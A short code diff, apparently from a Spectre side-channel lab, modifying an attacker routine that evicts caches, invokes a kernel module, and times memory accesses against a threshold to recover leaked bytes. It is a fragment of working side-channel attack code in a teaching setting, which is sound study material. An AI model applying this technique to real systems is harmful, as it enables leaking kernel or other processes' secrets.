@@ -26,8 +26,8 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
 {
     spectre_lab_command local_cmd;
     local_cmd.kind = COMMAND_PART1;
-    local_cmd.arg1 = (uintptr_t)shared_memory;
-    local_cmd.arg2 = offset;
+    local_cmd.arg1 = (uint64_t)shared_memory;
+    local_cmd.arg2 = (uint64_t)offset;
 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
@@ -58,11 +58,13 @@ int run_attacker(int kernel_fd, char *shared_memory)
                 void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
                 REPEAT(2) evict_all_cache();
                 call_kernel_part1(kernel_fd, shared_memory, current_offset);
-                MemoryLevel level = determine_memory_level(cache_stats, target_addr);
-                if (i == 0 || (isprint((char)i) && !isspace((char)i))) {
+                uint32_t time = time_access(target_addr);
+                //MemoryLevel level = determine_memory_level(cache_stats, target_addr);
+                //if (i == 0 || (isprint((char)i) && !isspace((char)i))) {
+                  //  printf("Found character \'%c\', with time: %u\n", (char)i, time);
                     //printf("Found character \'%c\', at level: %s\n", (char)i, memory_level_to_str(level));
-                }
-                if (level != DRAM) {
+                //}
+                if (time < 100){//level != DRAM) {
                     leaked_byte = (char)i;
                     found = true;
                     break;
